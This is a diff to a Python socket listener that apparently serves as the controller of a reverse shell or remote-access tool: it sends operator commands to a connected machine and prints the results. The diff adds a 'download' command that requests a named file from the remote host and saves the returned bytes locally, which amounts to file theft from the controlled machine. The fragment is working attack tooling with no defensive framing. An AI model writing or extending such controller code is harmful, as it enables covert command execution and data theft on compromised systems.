@@ -1,3 +1,4 @@
+
 import socket
 
 listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -32,6 +33,15 @@ while True:
 		recv = recv_data()
 		print(recv.decode("utf-8"))
 		continue
+	
+	elif cmd[:8] == "download":
+		connection.send(bytes(cmd, "utf-8"))
+		file_output = recv_data()
+		
+		with open(f'{cmd[9:]}', 'wb') as write_data:
+			write_data.write(file_output)
+			write_data.close()
+		continue 
 		
 	connection.send(bytes(cmd, "utf-8"))
 	
